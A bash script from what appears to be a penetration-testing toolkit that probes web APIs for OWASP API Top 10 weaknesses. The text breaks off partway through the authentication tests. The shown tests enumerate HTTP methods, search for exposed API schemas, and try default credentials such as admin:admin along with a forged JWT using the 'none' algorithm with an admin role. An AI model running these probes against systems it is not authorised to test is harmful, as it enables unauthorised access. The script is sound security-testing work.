#!/bin/bash
# L1 ORC-NAV — read MRK:NAV_TOC first; fetch MRK ranges precisely (no default line count)
# L2 NAV:v1 → ./LOCAL-INDEX.md

# MRK:09_NAV_TOC — Section index | nav,toc,index | L5-79
# - MRK:09_ROOT — ROOT CHECK | root,check,euid | L80-89 | ⚠ no-insert-before
# - MRK:09_CONF — ENGAGEMENT CONFIGURATION | conf,engagement,configuration,config,curl | L90-145 | ⚠ no-insert-before; propose-before-edit; read-toc-first
# - MRK:09_LOG — COLOURS AND LOGGING | log,colours,logging | L146-168 | ⚠ no-insert-before
# - MRK:09_ARGS — ARGUMENT PARSING | args,argument,parsing | L169-198 | ⚠ no-insert-before
# - MRK:09_DB — MSF DB HELPERS | db,msf,helpers,web,ports | L199-254 | ⚠ no-insert-before; propose-before-edit; read-toc-first
# - MRK:09_CONFIRM — SCOPE CONFIRMATION | confirm,scope,confirmation | L255-273 | ⚠ no-insert-before; propose-before-edit
# - MRK:09_TARGETS — TARGET ASSEMBLY | targets,target,assembly | L274-306 | ⚠ no-insert-before; read-toc-first
# - MRK:09_FIND — FINDING WRITER | find,finding,writer,jsonl,jq | L307-332 | ⚠ no-insert-before; read-toc-first
# - MRK:09_UTILS — SHARED UTILITIES | utils,shared,utilities,curl,proxy | L333-397 | ⚠ no-insert-before
# - MRK:09_PROF — PROFILE SETUP | prof,profile,setup,quick,deep | L398-437 | ⚠ no-insert-before
# - MRK:09_T01 — T01 HTTP METHOD ENUM | t01,http,method,enum,methods | L438-502 | ⚠ read-toc-first
# - MRK:09_T02 — T02 SCHEMA DISCOVERY | t02,schema,discovery,swagger,openapi | L503-554 | ⚠ read-toc-first
# - MRK:09_T03 — T03 AUTHENTICATION | t03,authentication,auth,bypass,basic | L555-633 | ⚠ read-toc-first
# - MRK:09_T04 — T04 RATE LIMITING | t04,rate,limiting,limit,throttle | L634-683 | ⚠ read-toc-first
# - MRK:09_T05 — T05 CORS MISCONFIG | t05,cors,misconfig,origin,access | L684-737 | ⚠ read-toc-first
# - MRK:09_T06 — T06 BOLA/IDOR | t06,bola,idor,object,reference | L738-782 | ⚠ read-toc-first
# - MRK:09_T07 — T07 MASS ASSIGNMENT | t07,mass,assignment,params | L783-836 | ⚠ read-toc-first
# - MRK:09_T08 — T08 SECURITY HEADERS | t08,security,headers,csp,hsts | L837-904 | ⚠ read-toc-first
# - MRK:09_T09 — T09 JWT ATTACKS | t09,jwt,attacks,token,rs256 | L905-1004 | ⚠ read-toc-first
# - MRK:09_T10 — T10 GRAPHQL | t10,graphql,introspection,batch | L1005-1077 | ⚠ read-toc-first
# - MRK:09_T11 — T11 SSRF | t11,ssrf,imds,aws,gcp | L1078-1160 | ⚠ read-toc-first
# - MRK:09_T12 — T12 XXE | t12,xxe,xml,entity,oob | L1161-1214 | ⚠ read-toc-first
# - MRK:09_T13 — T13 SSTI | t13,ssti,template,injection | L1215-1269 | ⚠ read-toc-first
# - MRK:09_T14 — T14 HTTP SMUGGLING | t14,http,smuggling,cl,te | L1270-1322 | ⚠ read-toc-first; deep-only
# - MRK:09_T15 — T15 HOST HEADER INJECTION | t15,host,header,injection,ssrf | L1323-1372 | ⚠ read-toc-first
# - MRK:09_T16 — T16 API VERSIONING | t16,api,versioning,v1,v2 | L1373-1413 | ⚠ read-toc-first
# - MRK:09_T17 — T17 SENSITIVE DATA EXPOSURE | t17,sensitive,data,exposure,pii | L1414-1474 | ⚠ read-toc-first
# - MRK:09_T18 — T18 BUSINESS LOGIC | t18,business,logic,workflow,flow | L1475-1527 | ⚠ read-toc-first
# - MRK:09_T19 — T19 WEBSOCKET DETECTION | t19,websocket,detection,ws,upgrade | L1528-1562 | ⚠ read-toc-first
# - MRK:09_T20 — T20 TLS & TRANSPORT CHECKS | t20,tls,transport,checks,cipher | L1563-1633 | ⚠ read-toc-first
# - MRK:09_T21 — T21 PACKAGE MANIFEST EXPOSURE | t21,package,manifest,osv,ecosystem | L1636-XXXX | ⚠ read-toc-first
# - MRK:09_T22 — T22 DESERIALIZATION ATTACK SURFACE | t22,deserial,java,php,dotnet,viewstate | LXXXX-XXXX | ⚠ read-toc-first
# - MRK:09_T23 — T23 FILE UPLOAD BYPASS | t23,upload,bypass,magic,mime,double,ext | LXXXX-XXXX | ⚠ read-toc-first
# - MRK:09_TRUN — PER-TARGET DISPATCHER | trun,target,dispatcher,test | LXXXX-XXXX | ⚠ no-insert-before; read-toc-first
# - MRK:09_MAIN — MAIN ENTRY POINT | main,entry,point,summary | LXXXX-XXXX | ⚠ no-insert-before; read-toc-first
# NAV-LEN: 35 entries | Integrity-hash: NEEDS-REINDEX | Last-indexed: 2026-06-24
# <!-- NAV-NEEDS-REINDEX: 2026-06-24 — T22 deserialization + T23 file upload bypass added -->
# <!-- NAV-NEEDS-REINDEX: 2026-06-23 — T21 added; line ranges shifted -->

# =============================================================================
# 09_app_api_review.sh — TechGuard. [VAPT-Advanced v2.0 — 2026-06-09]
# Application / API security review — OWASP API Top 10 (2023) + Advanced Attacks
# Coverage: HTTP methods, schema discovery, auth bypass, rate limiting, CORS,
#   BOLA/IDOR, mass assignment, security headers, JWT attacks, GraphQL, SSRF,
#   XXE, SSTI, HTTP smuggling, host header injection, API versioning,
#   sensitive data exposure, business logic, WebSocket detection, TLS checks,
#   package manifest exposure (package.json/requirements.txt/go.mod/pom.xml/etc.)
# Profiles: quick | standard (default) | deep | owasp-api
# Proxy:    --intercept-proxy http://127.0.0.1:8080 (Burp/ZAP)
# Consumes: MSF DB (web hosts from 03_comp_scan / 05_web_enum) or --host/--targets
# Produces: per-host evidence files + JSONL findings + markdown summary
# =============================================================================
# USAGE:
#   ./09_app_api_review.sh [OPTIONS]
#
# OPTIONS:
#   --targets <file>          File with host:port entries (one per line)
#   --host <IP:PORT>          Single target (repeatable)
#   --from-db                 Pull web hosts from MSF DB (default if no targets given)
#   --tier <n>                ghost|normal|loud — controls delays
#   --creds <user:pass>       HTTP Basic / login credentials
#   --token <bearer>          Bearer token for JWT/auth tests
#   --profile <name>          quick|standard|deep|owasp-api (default: standard)
#   --api-base <path>         Base API path prefix (default: /api)
#   --api-version <v>         API version string (default: v1)
#   --graphql-url <path>      GraphQL endpoint path (default: /graphql)
#   --skip-test <N>           Skip test number N (repeatable)
#   --only-test <N>           Run only test N (repeatable)
#   --intercept-proxy <url>   Proxy all curl requests through Burp/ZAP
#   --cookie <name=value>     Session cookie to include in requests
#   --api-key <key>           API key to include as X-API-Key header
#   --wordlist <file>         Custom wordlist for parameter/path fuzzing
#   --fast                    Alias for --profile quick
#   --yes                     Skip interactive scope confirmation
#   --dry-run                 Print commands without executing
set -uo pipefail

SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"

# =============================================================================
# MRK:09_ROOT — ROOT CHECK | root,check,euid | L80-89
# NAV-RULE: no-insert-before
# =============================================================================
if [[ "$EUID" -ne 0 ]] && [[ "${PTORC_ALLOW_NON_ROOT:-0}" != "1" ]]; then
    echo "[ERROR] This script must be run as root."
    echo "        Run: sudo $0 $*"
    exit 1
fi

# =============================================================================
# MRK:09_CONF — ENGAGEMENT CONFIGURATION | conf,engagement,configuration,config,curl | L90-145
# NAV-RULE: no-insert-before; propose-before-edit; read-toc-first
# =============================================================================

[[ -f "${SCRIPT_DIR}/pt-orc.conf" ]] && source "${SCRIPT_DIR}/pt-orc.conf" \
    || echo "[WARN] pt-orc.conf not found in ${SCRIPT_DIR}"

[[ -f "${SCRIPT_DIR}/orc-common-lib.sh" ]] && source "${SCRIPT_DIR}/orc-common-lib.sh" \
    || echo "[WARN] orc-common-lib.sh not found — trail/notes writes disabled"

PROJ_SLUG="${PROJECT_NAME//[^A-Za-z0-9._-]/_}"
EVIDENCE_BASE="${SCAN_EVIDENCE_DIR:-${SCRIPT_DIR}/evidence}/${PROJ_SLUG}"

CURL_TIMEOUT="${CURL_TIMEOUT:-10}"
CURL_CONNECT=5

# Proxy args — populated by --intercept-proxy
CURL_PROXY_ARGS=()

# Profile and test selection
PROFILE="standard"
SKIP_TESTS=()
ONLY_TESTS=()

# Test flags (set by setup_profile)
_T_ENABLED=()
for _i in $(seq 1 23); do _T_ENABLED[$_i]=1; done

# Target options
TIER="${GLOBAL_TIER:-normal}"
FROM_DB=1
FAST_MODE=0
AUTO_YES=0
DRY_RUN=0

# Auth options
CREDS=""
BEARER_TOKEN=""
COOKIE_HEADER=""
API_KEY=""

# API configuration
API_BASE="/api"
API_VERSION="v1"
GRAPHQL_URL="/graphql"
WORDLIST=""

EXTRA_HOSTS=()
TARGETS_FILE=""

# Tier delay
tier_delay() { case "$1" in ghost) echo 2;; evasion) echo 3;; normal) echo 0;; loud) echo 0;; *) echo 0;; esac; }

# Known TLS ports
TLS_PORTS="443 8443 4443 9443 10443"

# =============================================================================
# MRK:09_LOG — COLOURS AND LOGGING | log,colours,logging | L146-168
# NAV-RULE: no-insert-before
# =============================================================================

RED='\033[0;31m'; GREEN='\033[0;32m'; YELLOW='\033[1;33m'
BLUE='\033[0;34m'; CYAN='\033[0;36m'; MAGENTA='\033[0;35m'; BOLD='\033[1m'; NC='\033[0m'

_ts()  { date +'%Y%m%d_%H%M%S'; }
_now() { date +'%Y-%m-%d %H:%M:%S'; }

SESSION_TS="$(_ts)"
EV_TS="$(_ev_ts)"
[[ "$EVIDENCE_BASE" != /* ]] && EVIDENCE_BASE="$(pwd)/${EVIDENCE_BASE}"
mkdir -p "${EVIDENCE_BASE}/_sweep" "${SCRIPT_DIR}/working"
LOG_FILE="${EVIDENCE_BASE}/_sweep/app_api_review_${SESSION_TS}.log"
FINDINGS_FILE="${SCRIPT_DIR}/working/$(ev_fname "09-appapi-findings" "jsonl")"
: > "$FINDINGS_FILE"

log()     { local m="[$(_now)] $1";   echo -e "${BLUE}${m}${NC}" >&2;    echo "${m}" >> "$LOG_FILE" 2>/dev/null || true; }
log_ok()  { local m="[$(_now)] ✓ $1"; echo -e "${GREEN}${m}${NC}" >&2;   echo "${m}" >> "$LOG_FILE" 2>/dev/null || true; }
log_warn(){ local m="[$(_now)] ⚠ $1"; echo -e "${YELLOW}${m}${NC}" >&2;  echo "${m}" >> "$LOG_FILE" 2>/dev/null || true; }
log_err() { local m="[$(_now)] ✗ $1"; echo -e "${RED}${m}${NC}" >&2;     echo "${m}" >> "$LOG_FILE" 2>/dev/null || true; }
log_info(){ local m="[$(_now)]   $1"; echo -e "${CYAN}${m}${NC}" >&2;    echo "${m}" >> "$LOG_FILE" 2>/dev/null || true; }
log_hi()  { local m="[$(_now)] ! $1"; echo -e "${MAGENTA}${m}${NC}" >&2; echo "${m}" >> "$LOG_FILE" 2>/dev/null || true; }

# =============================================================================
# MRK:09_ARGS — ARGUMENT PARSING | args,argument,parsing | L169-198
# NAV-RULE: no-insert-before
# =============================================================================

while [[ $# -gt 0 ]]; do
    case "$1" in
        --targets)          TARGETS_FILE="$2";          FROM_DB=0; shift 2 ;;
        --host)             EXTRA_HOSTS+=("$2");         FROM_DB=0; shift 2 ;;
        --from-db)          FROM_DB=1;                              shift   ;;
        --tier)             TIER="$2";                              shift 2 ;;
        --creds)            CREDS="$2";                             shift 2 ;;
        --token)            BEARER_TOKEN="$2";                      shift 2 ;;
        --profile)          PROFILE="$2";                           shift 2 ;;
        --api-base)         API_BASE="$2";                          shift 2 ;;
        --api-version)      API_VERSION="$2";                       shift 2 ;;
        --graphql-url)      GRAPHQL_URL="$2";                       shift 2 ;;
        --skip-test)        SKIP_TESTS+=("$2");                     shift 2 ;;
        --only-test)        ONLY_TESTS+=("$2");                     shift 2 ;;
        --intercept-proxy)  CURL_PROXY_ARGS=("-x" "$2");            shift 2 ;;
        --cookie)           COOKIE_HEADER="$2";                     shift 2 ;;
        --api-key)          API_KEY="$2";                           shift 2 ;;
        --wordlist)         WORDLIST="$2";                          shift 2 ;;
        --fast)             FAST_MODE=1; PROFILE="quick";           shift   ;;
        --yes)              AUTO_YES=1;                             shift   ;;
        --dry-run)          DRY_RUN=1;                              shift   ;;
        *) log_err "Unknown argument: $1"; exit 1 ;;
    esac
done

# =============================================================================
# MRK:09_DB — MSF DB HELPERS | db,msf,helpers,web,ports | L199-254
# NAV-RULE: no-insert-before; propose-before-edit; read-toc-first
# =============================================================================

MSF_DB_CONF="/usr/share/metasploit-framework/config/database.yml"
MSF_DB_USER="msf"; MSF_DB_NAME="msf"; MSF_DB_HOST="127.0.0.1"; MSF_DB_PORT="5432"
MSF_DB_PASS="${MSF_DB_PASS:-}"

parse_db_conf() {
    [[ -f "$MSF_DB_CONF" ]] || return
    MSF_DB_USER=$(grep -m1 'username:' "$MSF_DB_CONF" | awk '{print $2}' | tr -d "'\"" || echo "msf")
    MSF_DB_NAME=$(grep -m1 'database:'  "$MSF_DB_CONF" | awk '{print $2}' | tr -d "'\"" || echo "msf")
    MSF_DB_PORT=$(grep -m1 'port:'      "$MSF_DB_CONF" | awk '{print $2}' | tr -d "'\"" || echo "5432")
    MSF_DB_HOST="127.0.0.1"
    if [[ -z "${MSF_DB_PASS}" ]]; then
        MSF_DB_PASS=$(grep -m1 'password:' "$MSF_DB_CONF" | awk '{print $2}' | tr -d "'\"" 2>/dev/null || true)
    fi
    export MSF_DB_PASS
}

db_query() {
    PGPASSWORD="${MSF_DB_PASS:-}" psql -h "$MSF_DB_HOST" -p "$MSF_DB_PORT" \
        -U "$MSF_DB_USER" -d "$MSF_DB_NAME" -t -A -c "$1" 2>/dev/null || true
}

get_web_hosts_from_db() {
    local wid; wid=$(db_query \
        "SELECT id FROM workspaces WHERE name='${PROJECT_NAME}' LIMIT 1;")
    if [[ -z "$wid" ]]; then
        log_warn "get_web_hosts_from_db: workspace '${PROJECT_NAME}' not found — trying CSV fallback"
        _get_web_hosts_csv; return
    fi
    local web_ports="80,443,8080,8443,4443,8888,9443,9200,10443,8006"
    local result
    result=$(db_query "SELECT host(h.address) || ':' || s.port \
              FROM services s JOIN hosts h ON s.host_id = h.id \
              WHERE h.workspace_id=${wid} \
              AND s.proto='tcp' AND s.state='open' \
              AND s.port IN (${web_ports}) \
              ORDER BY host(h.address), s.port;")
    if [[ -n "$result" ]]; then
        echo "$result"
    else
        log_warn "get_web_hosts_from_db: no web ports found — trying CSV fallback"
        _get_web_hosts_csv
    fi
}

_get_web_hosts_csv() {
    local csv
    csv=$(find "${EVIDENCE_BASE}/_exports" -name 'services_tcp_*.csv' 2>/dev/null | sort | tail -1)
    [[ -z "$csv" ]] && return
    awk -F',' 'NR>1 && ($3=="80"||$3=="443"||$3=="8080"||$3=="8443"||$3=="4443") {print $1":"$3}' "$csv" 2>/dev/null || true
}

# =============================================================================
# MRK:09_CONFIRM — SCOPE CONFIRMATION | confirm,scope,confirmation | L255-273
# NAV-RULE: no-insert-before; propose-before-edit
# =============================================================================

confirm_scope() {
    local hosts=("$@")
    log_warn "=== SCOPE CONFIRMATION — App/API Review v2.0 ==="
    log_warn "Profile: ${PROFILE} | Tier: ${TIER} | Tests: 1-23"
    log_warn "Targets (${#hosts[@]}):"
    for h in "${hosts[@]}"; do
        log_warn "  → $h"
    done
    [[ "${AUTO_YES:-0}" -eq 1 ]] && { log_ok "Auto-confirmed (--yes)"; return 0; }
    echo -en "${YELLOW}Proceed with App/API review against these targets? [y/N]: ${NC}" >&2
    read -r ans
    [[ "$ans" =~ ^[Yy]$ ]] || { log_err "Aborted by user."; exit 0; }
}

# =============================================================================
# MRK:09_TARGETS — TARGET ASSEMBLY | targets,target,assembly | L274-306
# NAV-RULE: no-insert-before; read-toc-first
# =============================================================================

assemble_targets() {
    local -a all=()
    if [[ -n "$TARGETS_FILE" && -f "$TARGETS_FILE" ]]; then
        while IFS= read -r line; do
            line="${line%%#*}"; line="${line// /}"
            [[ -n "$line" ]] && all+=("$line")
        done < "$TARGETS_FILE"
    fi
    for h in "${EXTRA_HOSTS[@]+"${EXTRA_HOSTS[@]}"}"; do
        all+=("$h")
    done
    if [[ "${FROM_DB:-0}" -eq 1 && "${#all[@]}" -eq 0 ]]; then
        parse_db_conf
        local db_hosts
        db_hosts=$(get_web_hosts_from_db)
        if [[ -n "$db_hosts" ]]; then
            while IFS= read -r line; do
                [[ -n "$line" ]] && all+=("$line")
            done <<< "$db_hosts"
        fi
    fi
    if [[ "${#all[@]}" -eq 0 ]]; then
        log_err "No targets found. Use --host, --targets, or --from-db with an active MSF workspace."
        exit 1
    fi
    printf '%s\n' "${all[@]}"
}

# =============================================================================
# MRK:09_FIND — FINDING WRITER | find,finding,writer,jsonl,jq | L307-332
# NAV-RULE: no-insert-before; read-toc-first
# =============================================================================

_FIND_CTR=0

emit_finding() {
    local sev="$1" title="$2" desc="$3" rec="$4" ev_tag="$5"
    (( _FIND_CTR++ )) || true
    local ip_slug="${_CURRENT_IP//./_}"
    local fid="f-09-${ip_slug}-$(printf '%03d' "${_FIND_CTR}")"
    local ev_id="ev-09-${ip_slug}-$(printf '%03d' "${_FIND_CTR}")"
    local payload
    payload=$(printf '{"id":"%s","title":"%s","severity":"%s","phase":"09_app_api","evidence_ids":["%s"],"description":"%s","recommendation":"%s","retest_status":"n/a","residual_risk":""}' \
        "$fid" \
        "$(echo "$title" | sed 's/"/\\"/g')" \
        "$sev" \
        "${ev_tag:-$ev_id}" \
        "$(echo "$desc"  | sed 's/"/\\"/g')" \
        "$(echo "$rec"   | sed 's/"/\\"/g')")
    echo "$payload" >> "$FINDINGS_FILE"
    log_hi "FINDING [${sev^^}]: ${title}"
}

# emit_package_finding — like emit_finding but includes package_name + ecosystem fields
# consumed by step 14 T03 (OSV.dev correlation)
emit_package_finding() {
    local sev="$1" title="$2" desc="$3" rec="$4" pkg_name="$5" ecosystem="$6" ev_tag="${7:-}"
    (( _FIND_CTR++ )) || true
    local ip_slug="${_CURRENT_IP//./_}"
    local fid="f-09-${ip_slug}-$(printf '%03d' "${_FIND_CTR}")"
    local ev_id="ev-09-${ip_slug}-$(printf '%03d' "${_FIND_CTR}")"
    local payload
    payload=$(printf '{"id":"%s","title":"%s","severity":"%s","phase":"09_app_api","evidence_ids":["%s"],"description":"%s","recommendation":"%s","retest_status":"n/a","residual_risk":"","package_name":"%s","ecosystem":"%s"}' \
        "$fid" \
        "$(echo "$title"     | sed 's/"/\\"/g')" \
        "$sev" \
        "${ev_tag:-$ev_id}" \
        "$(echo "$desc"      | sed 's/"/\\"/g')" \
        "$(echo "$rec"       | sed 's/"/\\"/g')" \
        "$(echo "$pkg_name"  | sed 's/"/\\"/g')" \
        "$(echo "$ecosystem" | sed 's/"/\\"/g')")
    echo "$payload" >> "$FINDINGS_FILE"
    log_hi "FINDING [${sev^^}]: ${title} [pkg:${ecosystem}/${pkg_name}]"
}

# =============================================================================
# MRK:09_UTILS — SHARED UTILITIES | utils,shared,utilities,curl,proxy | L333-397
# NAV-RULE: no-insert-before
# =============================================================================

_curl() {
    if [[ "${DRY_RUN:-0}" -eq 1 ]]; then
        log_info "  [DRY-RUN] curl -sk --max-time ${CURL_TIMEOUT} --connect-timeout ${CURL_CONNECT} ${CURL_PROXY_ARGS[*]+"${CURL_PROXY_ARGS[*]}"} $*"
        return 0
    fi
    curl -sk --max-time "$CURL_TIMEOUT" --connect-timeout "$CURL_CONNECT" \
        "${CURL_PROXY_ARGS[@]+"${CURL_PROXY_ARGS[@]}"}" "$@" 2>/dev/null || true
}

_curl_head() {
    _curl -I "$@"
}

# Build common auth headers for curl
_auth_args() {
    local -a args=()
    [[ -n "${BEARER_TOKEN:-}" ]] && args+=(-H "Authorization: Bearer ${BEARER_TOKEN}")
    [[ -n "${CREDS:-}"         ]] && args+=(-u "${CREDS}")
    [[ -n "${COOKIE_HEADER:-}" ]] && args+=(-H "Cookie: ${COOKIE_HEADER}")
    [[ -n "${API_KEY:-}"       ]] && args+=(-H "X-API-Key: ${API_KEY}")
    printf '%s\n' "${args[@]+"${args[@]}"}"
}

# Build scheme prefix based on port
_scheme() {
    local port="$1"
    if echo "$TLS_PORTS" | grep -qw "$port"; then echo "https"; else echo "http"; fi
}

# Save evidence helper
_save_ev() {
    local evfile="$1"; shift
    echo "$@" >> "$evfile" 2>/dev/null || true
}

# Sleep per tier
_tier_sleep() {
    local d; d=$(tier_delay "$TIER")
    [[ "$d" -gt 0 ]] && sleep "$d"
}

# Check if test N is enabled
_test_skip() {
    local n="$1"
    # If ONLY_TESTS is set, skip unless this test is in it
    if [[ "${#ONLY_TESTS[@]}" -gt 0 ]]; then
        local found=0
        for o in "${ONLY_TESTS[@]}"; do [[ "$o" == "$n" ]] && found=1; done
        [[ "$found" -eq 0 ]] && return 0   # skip (return 0 = skip in: _test_skip N || run_test)
    fi
    # If in SKIP_TESTS, skip
    for s in "${SKIP_TESTS[@]+"${SKIP_TESTS[@]}"}"; do
        [[ "$s" == "$n" ]] && return 0
    done
    # If profile disabled it
    local enabled="${_T_ENABLED[$n]:-1}"
    [[ "$enabled" -eq 0 ]] && return 0
    return 1  # not skipping — return 1 triggers the || test_NN_*() call
}

# =============================================================================
# MRK:09_PROF — PROFILE SETUP | prof,profile,setup,quick,deep | L398-437
# NAV-RULE: no-insert-before
# =============================================================================

setup_profile() {
    log_info "Profile: ${PROFILE}"
    case "$PROFILE" in
        quick)
            # T01 T08 T03 T04 T05 only
            for i in 2 6 7 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23; do
                _T_ENABLED[$i]=0
            done
            ;;
        standard)
            # Skip deep-only and time-expensive: smuggling (14), XXE (12 - only if XML detected at runtime), heavy SSTI
            _T_ENABLED[14]=0
            ;;
        deep)
            # All tests enabled — nothing disabled
            ;;
        owasp-api)
            # OWASP API Top 10 focused: BOLA(6), Auth(3), BOPLA(7), Rate(4), BFLA(4+18), SSRF(11), Misconfig(8), Versioning(16), Unsafe3rd(17)
            # Keep: 1,3,4,5,6,7,8,9,11,15,16,17,18,22,23; disable: 10,12,13,14,19,20,21
            for i in 10 12 13 14 19 20 21; do
                _T_ENABLED[$i]=0
            done
            ;;
        *)
            log_warn "Unknown profile '${PROFILE}' — using standard"
            _T_ENABLED[14]=0
            ;;
    esac

    # Apply explicit skip/only after profile
    for s in "${SKIP_TESTS[@]+"${SKIP_TESTS[@]}"}"; do
        _T_ENABLED[$s]=0
    done
}

# =============================================================================
# MRK:09_T01 — T01 HTTP METHOD ENUM | t01,http,method,enum,methods | L438-502
# NAV-RULE: read-toc-first
# =============================================================================

test_01_http_methods() {
    local base_url="$1" ev_dir="$2" ip="$3" port="$4"
    local evfile="${ev_dir}/$(ev_fname "api-t01-http-methods" "txt")"
    log "T01: HTTP Method Enumeration — ${base_url}"

    local dangerous_methods=("PUT" "DELETE" "PATCH" "TRACE" "CONNECT" "PROPFIND" "PROPPATCH" "MKCOL" "COPY" "MOVE" "LOCK" "UNLOCK")
    local found_dangerous=""

    # OPTIONS probe
    local opts_resp
    opts_resp=$(_curl -X OPTIONS -D - "${base_url}/" 2>/dev/null || true)
    echo "[T01] OPTIONS response:" >> "$evfile"
    echo "$opts_resp" >> "$evfile"

    local allow_header
    allow_header=$(echo "$opts_resp" | grep -i '^Allow:' | head -1 || true)
    echo "[T01] Allow: ${allow_header}" >> "$evfile"
    _tier_sleep

    # Probe each dangerous method
    for method in "${dangerous_methods[@]}"; do
        local resp
        resp=$(_curl -X "$method" -o /dev/null -w "%{http_code}" "${base_url}/api-method-test" 2>/dev/null || true)
        echo "[T01] ${method} → HTTP ${resp}" >> "$evfile"
        if [[ "$resp" =~ ^(200|201|204|405)$ ]]; then
            [[ "$resp" != "405" ]] && found_dangerous+="${method}(${resp}) "
        fi
        _tier_sleep
    done

    # TRACE XST check
    local trace_resp
    trace_resp=$(_curl -X TRACE -D - "${base_url}/" || true)
    local trace_code; trace_code=$(echo "$trace_resp" | grep -m1 "^HTTP" | awk '{print $2}' || true)
    echo "[T01] TRACE → HTTP ${trace_code}" >> "$evfile"
    echo "$trace_resp" >> "$evfile"
    if [[ "$trace_code" == "200" ]]; then
        emit_finding "medium" \
            "HTTP TRACE Method Enabled — XST Risk (${ip}:${port})" \
            "The TRACE HTTP method is enabled on ${base_url}. This can facilitate Cross-Site Tracing (XST) attacks allowing session cookie theft." \
            "Disable TRACE method in web server configuration. Apache: TraceEnable off; Nginx: if (\$request_method = TRACE) { return 405; }" \
            "ev-09-${ip//./_}-t01-trace"
    fi

    if [[ -n "$found_dangerous" ]]; then
        emit_finding "medium" \
            "Dangerous HTTP Methods Enabled (${ip}:${port})" \
            "Dangerous HTTP methods are accepted: ${found_dangerous}. This may allow unauthorized file manipulation or data exposure on ${base_url}." \
            "Restrict HTTP methods to GET, POST, HEAD via server configuration or WAF rules." \
            "ev-09-${ip//./_}-t01-methods"
    fi

    if [[ -n "$allow_header" ]]; then
        log_info "T01: ${allow_header}"
    fi

    echo "T01_METHODS_DONE" >> "$evfile"
    _SUMMARY_METHODS="${found_dangerous:-none}"
}

# =============================================================================
# MRK:09_T02 — T02 SCHEMA DISCOVERY | t02,schema,discovery,swagger,openapi | L503-554
# NAV-RULE: read-toc-first
# =============================================================================

test_02_schema_discovery() {
    local base_url="$1" ev_dir="$2" ip="$3" port="$4"
    local evfile="${ev_dir}/$(ev_fname "api-t02-schema" "txt")"
    log "T02: Schema/API Discovery — ${base_url}"
    _SUMMARY_SCHEMA=0

    local schema_paths=(
        "/swagger.json" "/swagger.yaml" "/swagger/v1/swagger.json"
        "/api-docs" "/api-docs.json" "/openapi.json" "/openapi.yaml"
        "/v1/api-docs" "/v2/api-docs" "/v3/api-docs"
        "/.well-known/openapi.json"
        "/api/swagger.json" "/api/openapi.json"
        "/api/v1/swagger.json" "/api/v2/swagger.json"
        "${API_BASE}/swagger.json" "${API_BASE}/openapi.json"
        "/graphql" "/graphiql" "/playground" "/api/graphql"
        "/wsdl" "/api/wsdl" "/?wsdl" "/?WSDL"
        "/wadl" "/.wadl"
        "/api/schema" "/schema.json"
    )

    local exposed_schemas=""
    for path in "${schema_paths[@]}"; do
        local code
        code=$(_curl -o /dev/null -w "%{http_code}" "${base_url}${path}" || true)
        echo "[T02] ${path} → HTTP ${code}" >> "$evfile"
        if [[ "$code" =~ ^(200|201)$ ]]; then
            local body
            body=$(_curl "${base_url}${path}" | head -c 512 || true)
            echo "[T02] Body snippet: ${body:0:200}" >> "$evfile"
            exposed_schemas+="${path}(${code}) "
            _SUMMARY_SCHEMA=1
        fi
        _tier_sleep
    done

    if [[ -n "$exposed_schemas" ]]; then
        emit_finding "high" \
            "API Schema/Documentation Publicly Exposed (${ip}:${port})" \
            "API schema or documentation endpoints are publicly accessible: ${exposed_schemas}. This exposes full API surface, endpoint parameters, and authentication mechanisms to attackers." \
            "Restrict schema endpoints behind authentication. Remove swagger/openapi files from production or gate behind IP allowlisting." \
            "ev-09-${ip//./_}-t02-schema"
        log_warn "T02: Schema exposed — ${exposed_schemas}"
    else
        log_ok "T02: No schema endpoints exposed"
    fi
}

# =============================================================================
# MRK:09_T03 — T03 AUTHENTICATION | t03,authentication,auth,bypass,basic | L555-633
# NAV-RULE: read-toc-first
# =============================================================================

test_03_authentication() {
    local base_url="$1" ev_dir="$2" ip="$3" port="$4"
    local evfile="${ev_dir}/$(ev_fname "api-t03-auth" "txt")"
    log "T03: Authentication Tests — ${base_url}"
    _SUMMARY_AUTH=0

    local api_ep="${base_url}${API_BASE}/${API_VERSION}"

    # Probe protected endpoints without credentials
    local probe_paths=("${api_ep}/users" "${api_ep}/admin" "${api_ep}/profile"
                       "${api_ep}/settings" "${api_ep}/dashboard" "${base_url}/admin"
                       "${base_url}/api/admin" "${base_url}/manage")

    for path in "${probe_paths[@]}"; do
        local code
        code=$(_curl -o /dev/null -w "%{http_code}" "$path" || true)
        echo "[T03] No-auth probe: ${path} → HTTP ${code}" >> "$evfile"
        if [[ "$code" =~ ^(200|201)$ ]]; then
            _SUMMARY_AUTH=1
            emit_finding "critical" \
                "Authentication Bypass — Unauthenticated Access to Protected Endpoint (${ip}:${port})" \
                "Protected endpoint ${path} returns HTTP ${code} without any authentication credentials. This represents a critical authentication failure (OWASP API2)." \
                "Enforce authentication on all API endpoints. Implement middleware that validates tokens/sessions before any business logic executes." \
                "ev-09-${ip//./_}-t03-bypass"
        fi
        _tier_sleep
    done

    # Null/empty bearer token
    local null_code
    null_code=$(_curl -o /dev/null -w "%{http_code}" -H "Authorization: Bearer " "${api_ep}/users" || true)
    echo "[T03] Empty bearer → HTTP ${null_code}" >> "$evfile"
    [[ "$null_code" =~ ^(200|201)$ ]] && { _SUMMARY_AUTH=1
        emit_finding "high" "Authentication Bypass via Empty Bearer Token (${ip}:${port})" \
            "Sending an empty Bearer token to ${api_ep}/users returns HTTP ${null_code}. The server is not validating token presence." \
            "Validate token presence and format before processing requests. Reject empty or malformed Authorization headers with HTTP 401." \
            "ev-09-${ip//./_}-t03-empty-bearer"
    }

    # HTTP Basic with common default creds
    local default_creds=("admin:admin" "admin:password" "admin:123456" "api:api" "test:test" "guest:guest")
    for cred in "${default_creds[@]}"; do
        local code
        code=$(_curl -o /dev/null -w "%{http_code}" -u "$cred" "${base_url}/admin" || true)
        echo "[T03] Basic auth ${cred} → HTTP ${code}" >> "$evfile"
        if [[ "$code" =~ ^(200|201|302)$ ]]; then
            _SUMMARY_AUTH=1
            emit_finding "critical" \
                "Default Credentials Accepted — ${cred} (${ip}:${port})" \
                "Default credentials '${cred}' were accepted at ${base_url}/admin (HTTP ${code}). This represents a critical configuration failure." \
                "Change all default credentials immediately. Implement account lockout after failed attempts. Enforce strong password policy." \
                "ev-09-${ip//./_}-t03-default-creds"
        fi
        _tier_sleep
    done

    # JWT none algorithm
    local jwt_none="eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiIxIiwicm9sZSI6ImFkbWluIn0."
    local none_code
